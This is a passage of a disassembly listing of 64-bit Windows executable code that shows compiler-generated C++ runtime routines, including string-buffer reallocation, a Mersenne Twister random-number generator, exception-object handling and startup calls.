   140006713:	e8 08 06 00 00       	call   0x140006d20
   140006718:	eb 39                	jmp    0x140006753
   14000671a:	45 33 c9             	xor    %r9d,%r9d
   14000671d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006724:	00 00 
   140006726:	45 33 c0             	xor    %r8d,%r8d
   140006729:	33 d2                	xor    %edx,%edx
   14000672b:	33 c9                	xor    %ecx,%ecx
   14000672d:	ff 15 0d 2e 00 00    	call   *0x2e0d(%rip)        # 0x140009540
   140006733:	cc                   	int3
   140006734:	48 8b d6             	mov    %rsi,%rdx
   140006737:	e8 7f 15 00 00       	call   0x140007cbb
   14000673c:	4d 8b c4             	mov    %r12,%r8
   14000673f:	48 8d 15 72 36 00 00 	lea    0x3672(%rip),%rdx        # 0x140009db8
   140006746:	49 8b cf             	mov    %r15,%rcx
   140006749:	e8 6d 15 00 00       	call   0x140007cbb
   14000674e:	43 c6 04 27 00       	movb   $0x0,(%r15,%r12,1)
   140006753:	48 89 3e             	mov    %rdi,(%rsi)
   140006756:	48 8b c6             	mov    %rsi,%rax
   140006759:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   14000675e:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   140006763:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140006768:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   14000676d:	48 83 c4 40          	add    $0x40,%rsp
   140006771:	5e                   	pop    %rsi
   140006772:	5d                   	pop    %rbp
   140006773:	5b                   	pop    %rbx
   140006774:	c3                   	ret
   140006775:	e8 36 ac ff ff       	call   0x1400013b0
   14000677a:	cc                   	int3
   14000677b:	e8 10 ab ff ff       	call   0x140001290
   140006780:	cc                   	int3
   140006781:	cc                   	int3
   140006782:	cc                   	int3
   140006783:	cc                   	int3
   140006784:	cc                   	int3
   140006785:	cc                   	int3
   140006786:	cc                   	int3
   140006787:	cc                   	int3
   140006788:	cc                   	int3
   140006789:	cc                   	int3
   14000678a:	cc                   	int3
   14000678b:	cc                   	int3
   14000678c:	cc                   	int3
   14000678d:	cc                   	int3
   14000678e:	cc                   	int3
   14000678f:	cc                   	int3
   140006790:	48 83 ec 28          	sub    $0x28,%rsp
   140006794:	48 8b 11             	mov    (%rcx),%rdx
   140006797:	48 8b 02             	mov    (%rdx),%rax
   14000679a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000679e:	48 8b 4c 11 48       	mov    0x48(%rcx,%rdx,1),%rcx
   1400067a3:	48 85 c9             	test   %rcx,%rcx
   1400067a6:	74 07                	je     0x1400067af
   1400067a8:	48 8b 01             	mov    (%rcx),%rax
   1400067ab:	ff 50 10             	call   *0x10(%rax)
   1400067ae:	90                   	nop
   1400067af:	48 83 c4 28          	add    $0x28,%rsp
   1400067b3:	c3                   	ret
   1400067b4:	cc                   	int3
   1400067b5:	cc                   	int3
   1400067b6:	cc                   	int3
   1400067b7:	cc                   	int3
   1400067b8:	cc                   	int3
   1400067b9:	cc                   	int3
   1400067ba:	cc                   	int3
   1400067bb:	cc                   	int3
   1400067bc:	cc                   	int3
   1400067bd:	cc                   	int3
   1400067be:	cc                   	int3
   1400067bf:	cc                   	int3
   1400067c0:	40 53                	rex push %rbx
   1400067c2:	55                   	push   %rbp
   1400067c3:	56                   	push   %rsi
   1400067c4:	48 83 ec 40          	sub    $0x40,%rsp
   1400067c8:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   1400067cc:	48 bb fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbx
   1400067d3:	ff ff 7f 
   1400067d6:	48 8b c3             	mov    %rbx,%rax
   1400067d9:	48 8b f1             	mov    %rcx,%rsi
   1400067dc:	48 2b c5             	sub    %rbp,%rax
   1400067df:	48 3b c2             	cmp    %rdx,%rax
   1400067e2:	0f 82 70 01 00 00    	jb     0x140006958
   1400067e8:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   1400067ed:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1400067f2:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   1400067f6:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400067fb:	4c 8d 3c 2a          	lea    (%rdx,%rbp,1),%r15
   1400067ff:	49 8b d7             	mov    %r15,%rdx
   140006802:	48 83 ca 07          	or     $0x7,%rdx
   140006806:	48 3b d3             	cmp    %rbx,%rdx
   140006809:	77 3f                	ja     0x14000684a
   14000680b:	49 8b ce             	mov    %r14,%rcx
   14000680e:	48 8b c3             	mov    %rbx,%rax
   140006811:	48 d1 e9             	shr    $1,%rcx
   140006814:	48 2b c1             	sub    %rcx,%rax
   140006817:	4c 3b f0             	cmp    %rax,%r14
   14000681a:	77 2e                	ja     0x14000684a
   14000681c:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   140006820:	48 8b da             	mov    %rdx,%rbx
   140006823:	48 3b d0             	cmp    %rax,%rdx
   140006826:	48 0f 42 d8          	cmovb  %rax,%rbx
   14000682a:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140006831:	ff ff 7f 
   140006834:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140006838:	48 3b c8             	cmp    %rax,%rcx
   14000683b:	0f 87 1d 01 00 00    	ja     0x14000695e
   140006841:	48 03 c9             	add    %rcx,%rcx
   140006844:	75 12                	jne    0x140006858
   140006846:	33 ff                	xor    %edi,%edi
   140006848:	eb 4b                	jmp    0x140006895
   14000684a:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140006851:	ff ff 7f 
   140006854:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140006858:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   14000685f:	72 2c                	jb     0x14000688d
   140006861:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140006865:	48 3b c1             	cmp    %rcx,%rax
   140006868:	0f 86 f0 00 00 00    	jbe    0x14000695e
   14000686e:	48 8b c8             	mov    %rax,%rcx
   140006871:	e8 b2 04 00 00       	call   0x140006d28
   140006876:	48 85 c0             	test   %rax,%rax
   140006879:	0f 84 8f 00 00 00    	je     0x14000690e
   14000687f:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140006883:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140006887:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   14000688b:	eb 08                	jmp    0x140006895
   14000688d:	e8 96 04 00 00       	call   0x140006d28
   140006892:	48 8b f8             	mov    %rax,%rdi
   140006895:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   14000689c:	00 
   14000689d:	48 8d 2c 6d 02 00 00 	lea    0x2(,%rbp,2),%rbp
   1400068a4:	00 
   1400068a5:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   1400068a9:	48 8d 15 90 33 00 00 	lea    0x3390(%rip),%rdx        # 0x140009c40
   1400068b0:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   1400068b4:	48 8b cf             	mov    %rdi,%rcx
   1400068b7:	4c 8d 04 00          	lea    (%rax,%rax,1),%r8
   1400068bb:	4d 8d 3c 38          	lea    (%r8,%rdi,1),%r15
   1400068bf:	49 83 fe 07          	cmp    $0x7,%r14
   1400068c3:	76 63                	jbe    0x140006928
   1400068c5:	48 8b 1e             	mov    (%rsi),%rbx
   1400068c8:	e8 ee 13 00 00       	call   0x140007cbb
   1400068cd:	4c 8b c5             	mov    %rbp,%r8
   1400068d0:	48 8b d3             	mov    %rbx,%rdx
   1400068d3:	49 8b cf             	mov    %r15,%rcx
   1400068d6:	e8 e0 13 00 00       	call   0x140007cbb
   1400068db:	4a 8d 14 75 02 00 00 	lea    0x2(,%r14,2),%rdx
   1400068e2:	00 
   1400068e3:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400068ea:	72 18                	jb     0x140006904
   1400068ec:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   1400068f0:	48 83 c2 27          	add    $0x27,%rdx
   1400068f4:	48 2b d8             	sub    %rax,%rbx
   1400068f7:	48 83 eb 08          	sub    $0x8,%rbx
   1400068fb:	48 83 fb 1f          	cmp    $0x1f,%rbx
   1400068ff:	77 0d                	ja     0x14000690e
   140006901:	48 8b d8             	mov    %rax,%rbx
   140006904:	48 8b cb             	mov    %rbx,%rcx
   140006907:	e8 14 04 00 00       	call   0x140006d20
   14000690c:	eb 2d                	jmp    0x14000693b
   14000690e:	45 33 c9             	xor    %r9d,%r9d
   140006911:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006918:	00 00 
   14000691a:	45 33 c0             	xor    %r8d,%r8d
   14000691d:	33 d2                	xor    %edx,%edx
   14000691f:	33 c9                	xor    %ecx,%ecx
   140006921:	ff 15 19 2c 00 00    	call   *0x2c19(%rip)        # 0x140009540
   140006927:	cc                   	int3
   140006928:	e8 8e 13 00 00       	call   0x140007cbb
   14000692d:	4c 8b c5             	mov    %rbp,%r8
   140006930:	48 8b d6             	mov    %rsi,%rdx
   140006933:	49 8b cf             	mov    %r15,%rcx
   140006936:	e8 80 13 00 00       	call   0x140007cbb
   14000693b:	48 89 3e             	mov    %rdi,(%rsi)
   14000693e:	48 8b c6             	mov    %rsi,%rax
   140006941:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140006946:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   14000694b:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   140006950:	48 83 c4 40          	add    $0x40,%rsp
   140006954:	5e                   	pop    %rsi
   140006955:	5d                   	pop    %rbp
   140006956:	5b                   	pop    %rbx
   140006957:	c3                   	ret
   140006958:	e8 53 aa ff ff       	call   0x1400013b0
   14000695d:	cc                   	int3
   14000695e:	e8 2d a9 ff ff       	call   0x140001290
   140006963:	cc                   	int3
   140006964:	cc                   	int3
   140006965:	cc                   	int3
   140006966:	cc                   	int3
   140006967:	cc                   	int3
   140006968:	cc                   	int3
   140006969:	cc                   	int3
   14000696a:	cc                   	int3
   14000696b:	cc                   	int3
   14000696c:	cc                   	int3
   14000696d:	cc                   	int3
   14000696e:	cc                   	int3
   14000696f:	cc                   	int3
   140006970:	8b 11                	mov    (%rcx),%edx
   140006972:	41 ba 70 02 00 00    	mov    $0x270,%r10d
   140006978:	4c 8b c9             	mov    %rcx,%r9
   14000697b:	41 3b d2             	cmp    %r10d,%edx
   14000697e:	75 51                	jne    0x1400069d1
   140006980:	4c 8d 41 08          	lea    0x8(%rcx),%r8
   140006984:	0f 1f 40 00          	nopl   0x0(%rax)
   140006988:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000698f:	00 
   140006990:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   140006994:	41 33 10             	xor    (%r8),%edx
   140006997:	4d 8d 40 04          	lea    0x4(%r8),%r8
   14000699b:	0f ba f2 1f          	btr    $0x1f,%edx
   14000699f:	41 33 50 f8          	xor    -0x8(%r8),%edx
   1400069a3:	8b c2                	mov    %edx,%eax
   1400069a5:	24 01                	and    $0x1,%al
   1400069a7:	f6 d8                	neg    %al
   1400069a9:	1b c9                	sbb    %ecx,%ecx
   1400069ab:	d1 ea                	shr    $1,%edx
   1400069ad:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   1400069b3:	41 33 88 2c 06 00 00 	xor    0x62c(%r8),%ecx
   1400069ba:	33 ca                	xor    %edx,%ecx
   1400069bc:	41 89 88 b8 09 00 00 	mov    %ecx,0x9b8(%r8)
   1400069c3:	49 83 ea 01          	sub    $0x1,%r10
   1400069c7:	75 c7                	jne    0x140006990
   1400069c9:	41 8b 11             	mov    (%r9),%edx
   1400069cc:	e9 e0 00 00 00       	jmp    0x140006ab1
   1400069d1:	81 fa e0 04 00 00    	cmp    $0x4e0,%edx
   1400069d7:	0f 82 d4 00 00 00    	jb     0x140006ab1
   1400069dd:	4c 8d 81 c8 09 00 00 	lea    0x9c8(%rcx),%r8
   1400069e4:	41 ba e3 00 00 00    	mov    $0xe3,%r10d
   1400069ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400069f0:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   1400069f4:	41 33 10             	xor    (%r8),%edx
   1400069f7:	4d 8d 40 04          	lea    0x4(%r8),%r8
   1400069fb:	0f ba f2 1f          	btr    $0x1f,%edx
   1400069ff:	41 33 50 f8          	xor    -0x8(%r8),%edx
   140006a03:	8b c2                	mov    %edx,%eax
   140006a05:	24 01                	and    $0x1,%al
   140006a07:	f6 d8                	neg    %al
   140006a09:	1b c9                	sbb    %ecx,%ecx
   140006a0b:	d1 ea                	shr    $1,%edx
   140006a0d:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   140006a13:	41 33 88 2c 06 00 00 	xor    0x62c(%r8),%ecx
   140006a1a:	33 ca                	xor    %edx,%ecx
   140006a1c:	41 89 88 38 f6 ff ff 	mov    %ecx,-0x9c8(%r8)
   140006a23:	49 83 ea 01          	sub    $0x1,%r10
   140006a27:	75 c7                	jne    0x1400069f0
   140006a29:	4d 8d 81 54 0d 00 00 	lea    0xd54(%r9),%r8
   140006a30:	41 ba 8c 01 00 00    	mov    $0x18c,%r10d
   140006a36:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140006a3d:	00 00 00 
   140006a40:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   140006a44:	41 33 10             	xor    (%r8),%edx
   140006a47:	4d 8d 40 04          	lea    0x4(%r8),%r8
   140006a4b:	0f ba f2 1f          	btr    $0x1f,%edx
   140006a4f:	41 33 50 f8          	xor    -0x8(%r8),%edx
   140006a53:	8b c2                	mov    %edx,%eax
   140006a55:	24 01                	and    $0x1,%al
   140006a57:	f6 d8                	neg    %al
   140006a59:	1b c9                	sbb    %ecx,%ecx
   140006a5b:	d1 ea                	shr    $1,%edx
   140006a5d:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   140006a63:	41 33 88 ac f2 ff ff 	xor    -0xd54(%r8),%ecx
   140006a6a:	33 ca                	xor    %edx,%ecx
   140006a6c:	41 89 88 38 f6 ff ff 	mov    %ecx,-0x9c8(%r8)
   140006a73:	49 83 ea 01          	sub    $0x1,%r10
   140006a77:	75 c7                	jne    0x140006a40
   140006a79:	41 8b 81 80 13 00 00 	mov    0x1380(%r9),%eax
   140006a80:	8b d0                	mov    %eax,%edx
   140006a82:	41 33 51 04          	xor    0x4(%r9),%edx
   140006a86:	0f ba f2 1f          	btr    $0x1f,%edx
   140006a8a:	33 d0                	xor    %eax,%edx
   140006a8c:	8b c2                	mov    %edx,%eax
   140006a8e:	24 01                	and    $0x1,%al
   140006a90:	f6 d8                	neg    %al
   140006a92:	1b c9                	sbb    %ecx,%ecx
   140006a94:	d1 ea                	shr    $1,%edx
   140006a96:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   140006a9c:	33 ca                	xor    %edx,%ecx
   140006a9e:	41 33 89 34 06 00 00 	xor    0x634(%r9),%ecx
   140006aa5:	33 d2                	xor    %edx,%edx
   140006aa7:	41 89 89 c0 09 00 00 	mov    %ecx,0x9c0(%r9)
   140006aae:	41 89 11             	mov    %edx,(%r9)
   140006ab1:	8b c2                	mov    %edx,%eax
   140006ab3:	41 8b 4c 81 04       	mov    0x4(%r9,%rax,4),%ecx
   140006ab8:	8d 42 01             	lea    0x1(%rdx),%eax
   140006abb:	41 89 01             	mov    %eax,(%r9)
   140006abe:	8b c1                	mov    %ecx,%eax
   140006ac0:	c1 e8 0b             	shr    $0xb,%eax
   140006ac3:	41 23 81 84 13 00 00 	and    0x1384(%r9),%eax
   140006aca:	33 c1                	xor    %ecx,%eax
   140006acc:	8b d0                	mov    %eax,%edx
   140006ace:	81 e2 ad 58 3a ff    	and    $0xff3a58ad,%edx
   140006ad4:	c1 e2 07             	shl    $0x7,%edx
   140006ad7:	33 d0                	xor    %eax,%edx
   140006ad9:	8b ca                	mov    %edx,%ecx
   140006adb:	81 e1 8c df ff ff    	and    $0xffffdf8c,%ecx
   140006ae1:	c1 e1 0f             	shl    $0xf,%ecx
   140006ae4:	33 ca                	xor    %edx,%ecx
   140006ae6:	8b c1                	mov    %ecx,%eax
   140006ae8:	c1 e8 12             	shr    $0x12,%eax
   140006aeb:	33 c1                	xor    %ecx,%eax
   140006aed:	c3                   	ret
   140006aee:	cc                   	int3
   140006aef:	cc                   	int3
   140006af0:	48 63 41 fc          	movslq -0x4(%rcx),%rax
   140006af4:	48 2b c8             	sub    %rax,%rcx
   140006af7:	e9 74 f2 ff ff       	jmp    0x140005d70
   140006afc:	ff 25 9e 26 00 00    	jmp    *0x269e(%rip)        # 0x1400091a0
   140006b02:	cc                   	int3
   140006b03:	cc                   	int3
   140006b04:	40 53                	rex push %rbx
   140006b06:	48 83 ec 20          	sub    $0x20,%rsp
   140006b0a:	48 8b d9             	mov    %rcx,%rbx
   140006b0d:	b9 10 00 00 00       	mov    $0x10,%ecx
   140006b12:	ff 15 58 29 00 00    	call   *0x2958(%rip)        # 0x140009470
   140006b18:	48 8b d0             	mov    %rax,%rdx
   140006b1b:	48 85 c0             	test   %rax,%rax
   140006b1e:	74 1b                	je     0x140006b3b
   140006b20:	48 8b 05 59 78 00 00 	mov    0x7859(%rip),%rax        # 0x14000e380
   140006b27:	48 89 02             	mov    %rax,(%rdx)
   140006b2a:	48 89 5a 08          	mov    %rbx,0x8(%rdx)
   140006b2e:	48 89 15 4b 78 00 00 	mov    %rdx,0x784b(%rip)        # 0x14000e380
   140006b35:	48 83 c4 20          	add    $0x20,%rsp
   140006b39:	5b                   	pop    %rbx
   140006b3a:	c3                   	ret
   140006b3b:	e8 11 00 00 00       	call   0x140006b51
   140006b40:	cc                   	int3
   140006b41:	cc                   	int3
   140006b42:	cc                   	int3
   140006b43:	cc                   	int3
   140006b44:	48 ff 25 9d 25 00 00 	rex.W jmp *0x259d(%rip)        # 0x1400090e8
   140006b4b:	ff 25 17 26 00 00    	jmp    *0x2617(%rip)        # 0x140009168
   140006b51:	ff 25 d1 25 00 00    	jmp    *0x25d1(%rip)        # 0x140009128
   140006b57:	cc                   	int3
   140006b58:	cc                   	int3
   140006b59:	cc                   	int3
   140006b5a:	cc                   	int3
   140006b5b:	cc                   	int3
   140006b5c:	cc                   	int3
   140006b5d:	cc                   	int3
   140006b5e:	cc                   	int3
   140006b5f:	cc                   	int3
   140006b60:	48 8b 05 99 74 00 00 	mov    0x7499(%rip),%rax        # 0x14000e000
   140006b67:	33 d2                	xor    %edx,%edx
   140006b69:	48 ff 25 e0 2a 00 00 	rex.W jmp *0x2ae0(%rip)        # 0x140009650
   140006b70:	40 53                	rex push %rbx
   140006b72:	48 83 ec 20          	sub    $0x20,%rsp
   140006b76:	48 8b d9             	mov    %rcx,%rbx
   140006b79:	48 8d 05 60 2b 00 00 	lea    0x2b60(%rip),%rax        # 0x1400096e0
   140006b80:	48 89 01             	mov    %rax,(%rcx)
   140006b83:	8b 42 08             	mov    0x8(%rdx),%eax
   140006b86:	89 41 08             	mov    %eax,0x8(%rcx)
   140006b89:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140006b8d:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   140006b91:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
   140006b98:	00 
   140006b99:	48 85 c9             	test   %rcx,%rcx
   140006b9c:	74 0d                	je     0x140006bab
   140006b9e:	48 8b 01             	mov    (%rcx),%rax
   140006ba1:	48 8b 40 08          	mov    0x8(%rax),%rax
   140006ba5:	ff 15 a5 2a 00 00    	call   *0x2aa5(%rip)        # 0x140009650
   140006bab:	48 8b c3             	mov    %rbx,%rax
   140006bae:	48 83 c4 20          	add    $0x20,%rsp
   140006bb2:	5b                   	pop    %rbx
   140006bb3:	c3                   	ret
   140006bb4:	cc                   	int3
   140006bb5:	cc                   	int3
   140006bb6:	cc                   	int3
   140006bb7:	cc                   	int3
   140006bb8:	cc                   	int3
   140006bb9:	cc                   	int3
   140006bba:	cc                   	int3
   140006bbb:	cc                   	int3
   140006bbc:	cc                   	int3
   140006bbd:	cc                   	int3
   140006bbe:	cc                   	int3
   140006bbf:	cc                   	int3
   140006bc0:	40 53                	rex push %rbx
   140006bc2:	48 83 ec 20          	sub    $0x20,%rsp
   140006bc6:	48 8b d9             	mov    %rcx,%rbx
   140006bc9:	48 8d 05 10 2b 00 00 	lea    0x2b10(%rip),%rax        # 0x1400096e0
   140006bd0:	48 89 01             	mov    %rax,(%rcx)
   140006bd3:	89 51 08             	mov    %edx,0x8(%rcx)
   140006bd6:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140006bda:	48 c7 41 18 00 00 00 	movq   $0x0,0x18(%rcx)
   140006be1:	00 
   140006be2:	4d 85 c0             	test   %r8,%r8
   140006be5:	74 15                	je     0x140006bfc
   140006be7:	45 84 c9             	test   %r9b,%r9b
   140006bea:	74 10                	je     0x140006bfc
   140006bec:	49 8b 00             	mov    (%r8),%rax
   140006bef:	49 8b c8             	mov    %r8,%rcx
   140006bf2:	48 8b 40 08          	mov    0x8(%rax),%rax
   140006bf6:	ff 15 54 2a 00 00    	call   *0x2a54(%rip)        # 0x140009650
   140006bfc:	48 8b c3             	mov    %rbx,%rax
   140006bff:	48 83 c4 20          	add    $0x20,%rsp
   140006c03:	5b                   	pop    %rbx
   140006c04:	c3                   	ret
   140006c05:	cc                   	int3
   140006c06:	cc                   	int3
   140006c07:	cc                   	int3
   140006c08:	cc                   	int3
   140006c09:	cc                   	int3
   140006c0a:	cc                   	int3
   140006c0b:	cc                   	int3
   140006c0c:	cc                   	int3
   140006c0d:	cc                   	int3
   140006c0e:	cc                   	int3
   140006c0f:	cc                   	int3
   140006c10:	40 53                	rex push %rbx
   140006c12:	48 83 ec 20          	sub    $0x20,%rsp
   140006c16:	48 8b d9             	mov    %rcx,%rbx
   140006c19:	48 8d 05 c0 2a 00 00 	lea    0x2ac0(%rip),%rax        # 0x1400096e0
   140006c20:	48 89 01             	mov    %rax,(%rcx)
   140006c23:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140006c27:	48 85 c9             	test   %rcx,%rcx
   140006c2a:	74 0d                	je     0x140006c39
   140006c2c:	48 8b 01             	mov    (%rcx),%rax
   140006c2f:	48 8b 40 10          	mov    0x10(%rax),%rax
   140006c33:	ff 15 17 2a 00 00    	call   *0x2a17(%rip)        # 0x140009650
   140006c39:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140006c3d:	48 85 c9             	test   %rcx,%rcx
   140006c40:	74 0c                	je     0x140006c4e
   140006c42:	48 83 c4 20          	add    $0x20,%rsp
   140006c46:	5b                   	pop    %rbx
   140006c47:	48 ff 25 8a 24 00 00 	rex.W jmp *0x248a(%rip)        # 0x1400090d8
   140006c4e:	48 83 c4 20          	add    $0x20,%rsp
   140006c52:	5b                   	pop    %rbx
   140006c53:	c3                   	ret
   140006c54:	cc                   	int3
   140006c55:	cc                   	int3
   140006c56:	cc                   	int3
   140006c57:	cc                   	int3
   140006c58:	cc                   	int3
   140006c59:	cc                   	int3
   140006c5a:	cc                   	int3
   140006c5b:	cc                   	int3
   140006c5c:	cc                   	int3
   140006c5d:	cc                   	int3
   140006c5e:	cc                   	int3
   140006c5f:	cc                   	int3
   140006c60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006c65:	57                   	push   %rdi
   140006c66:	48 83 ec 20          	sub    $0x20,%rsp
   140006c6a:	8b fa                	mov    %edx,%edi
   140006c6c:	48 8b d9             	mov    %rcx,%rbx
   140006c6f:	48 8d 05 6a 2a 00 00 	lea    0x2a6a(%rip),%rax        # 0x1400096e0
   140006c76:	48 89 01             	mov    %rax,(%rcx)
   140006c79:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140006c7d:	48 85 c9             	test   %rcx,%rcx
   140006c80:	74 0d                	je     0x140006c8f
   140006c82:	48 8b 01             	mov    (%rcx),%rax
   140006c85:	48 8b 40 10          	mov    0x10(%rax),%rax
   140006c89:	ff 15 c1 29 00 00    	call   *0x29c1(%rip)        # 0x140009650
   140006c8f:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140006c93:	48 85 c9             	test   %rcx,%rcx
   140006c96:	74 07                	je     0x140006c9f
   140006c98:	ff 15 3a 24 00 00    	call   *0x243a(%rip)        # 0x1400090d8
   140006c9e:	90                   	nop
   140006c9f:	40 f6 c7 01          	test   $0x1,%dil
   140006ca3:	74 0d                	je     0x140006cb2
   140006ca5:	ba 20 00 00 00       	mov    $0x20,%edx
   140006caa:	48 8b cb             	mov    %rbx,%rcx
   140006cad:	e8 6e 00 00 00       	call   0x140006d20
   140006cb2:	48 8b c3             	mov    %rbx,%rax
   140006cb5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006cba:	48 83 c4 20          	add    $0x20,%rsp
   140006cbe:	5f                   	pop    %rdi
   140006cbf:	c3                   	ret
   140006cc0:	48 83 ec 48          	sub    $0x48,%rsp
   140006cc4:	4c 8b c2             	mov    %rdx,%r8
   140006cc7:	45 33 c9             	xor    %r9d,%r9d
   140006cca:	8b d1                	mov    %ecx,%edx
   140006ccc:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006cd1:	e8 ea fe ff ff       	call   0x140006bc0
   140006cd6:	48 8d 15 63 4c 00 00 	lea    0x4c63(%rip),%rdx        # 0x14000b940
   140006cdd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006ce2:	e8 a5 0e 00 00       	call   0x140007b8c
   140006ce7:	cc                   	int3
   140006ce8:	cc                   	int3
   140006ce9:	cc                   	int3
   140006cea:	cc                   	int3
   140006ceb:	cc                   	int3
   140006cec:	cc                   	int3
   140006ced:	cc                   	int3
   140006cee:	cc                   	int3
   140006cef:	cc                   	int3
   140006cf0:	cc                   	int3
   140006cf1:	cc                   	int3
   140006cf2:	cc                   	int3
   140006cf3:	cc                   	int3
   140006cf4:	cc                   	int3
   140006cf5:	cc                   	int3
   140006cf6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140006cfd:	00 00 00 
   140006d00:	48 3b 0d 39 73 00 00 	cmp    0x7339(%rip),%rcx        # 0x14000e040
   140006d07:	75 10                	jne    0x140006d19
   140006d09:	48 c1 c1 10          	rol    $0x10,%rcx
   140006d0d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140006d12:	75 01                	jne    0x140006d15
   140006d14:	c3                   	ret
   140006d15:	48 c1 c9 10          	ror    $0x10,%rcx
   140006d19:	e9 b6 05 00 00       	jmp    0x1400072d4
   140006d1e:	cc                   	int3
   140006d1f:	cc                   	int3
   140006d20:	e9 f7 06 00 00       	jmp    0x14000741c
   140006d25:	cc                   	int3
   140006d26:	cc                   	int3
   140006d27:	cc                   	int3
   140006d28:	40 53                	rex push %rbx
   140006d2a:	48 83 ec 20          	sub    $0x20,%rsp
   140006d2e:	48 8b d9             	mov    %rcx,%rbx
   140006d31:	eb 0f                	jmp    0x140006d42
   140006d33:	48 8b cb             	mov    %rbx,%rcx
   140006d36:	e8 81 0e 00 00       	call   0x140007bbc
   140006d3b:	85 c0                	test   %eax,%eax
   140006d3d:	74 13                	je     0x140006d52
   140006d3f:	48 8b cb             	mov    %rbx,%rcx
   140006d42:	e8 6f 0e 00 00       	call   0x140007bb6
   140006d47:	48 85 c0             	test   %rax,%rax
   140006d4a:	74 e7                	je     0x140006d33
   140006d4c:	48 83 c4 20          	add    $0x20,%rsp
   140006d50:	5b                   	pop    %rbx
   140006d51:	c3                   	ret
   140006d52:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140006d56:	74 06                	je     0x140006d5e
   140006d58:	e8 eb 06 00 00       	call   0x140007448
   140006d5d:	cc                   	int3
   140006d5e:	e8 2d a5 ff ff       	call   0x140001290
   140006d63:	cc                   	int3
   140006d64:	40 53                	rex push %rbx
   140006d66:	48 83 ec 20          	sub    $0x20,%rsp
   140006d6a:	48 8d 05 af 29 00 00 	lea    0x29af(%rip),%rax        # 0x140009720
   140006d71:	48 8b d9             	mov    %rcx,%rbx
   140006d74:	48 89 01             	mov    %rax,(%rcx)
   140006d77:	f6 c2 01             	test   $0x1,%dl
   140006d7a:	74 0a                	je     0x140006d86
   140006d7c:	ba 18 00 00 00       	mov    $0x18,%edx
   140006d81:	e8 9a ff ff ff       	call   0x140006d20
   140006d86:	48 8b c3             	mov    %rbx,%rax
   140006d89:	48 83 c4 20          	add    $0x20,%rsp
   140006d8d:	5b                   	pop    %rbx
   140006d8e:	c3                   	ret
   140006d8f:	cc                   	int3
   140006d90:	40 53                	rex push %rbx
   140006d92:	48 83 ec 20          	sub    $0x20,%rsp
   140006d96:	b9 02 00 00 00       	mov    $0x2,%ecx
   140006d9b:	e8 28 0e 00 00       	call   0x140007bc8
   140006da0:	e8 7f 07 00 00       	call   0x140007524
   140006da5:	8b c8                	mov    %eax,%ecx
   140006da7:	e8 52 0e 00 00       	call   0x140007bfe
   140006dac:	e8 67 07 00 00       	call   0x140007518
   140006db1:	8b d8                	mov    %eax,%ebx
   140006db3:	e8 6a 0e 00 00       	call   0x140007c22
   140006db8:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006dbd:	89 18                	mov    %ebx,(%rax)
   140006dbf:	e8 b0 02 00 00       	call   0x140007074
   140006dc4:	84 c0                	test   %al,%al
   140006dc6:	74 73                	je     0x140006e3b
   140006dc8:	e8 17 0a 00 00       	call   0x1400077e4
   140006dcd:	48 8d 0d 4c 0a 00 00 	lea    0xa4c(%rip),%rcx        # 0x140007820
   140006dd4:	e8 4b 04 00 00       	call   0x140007224
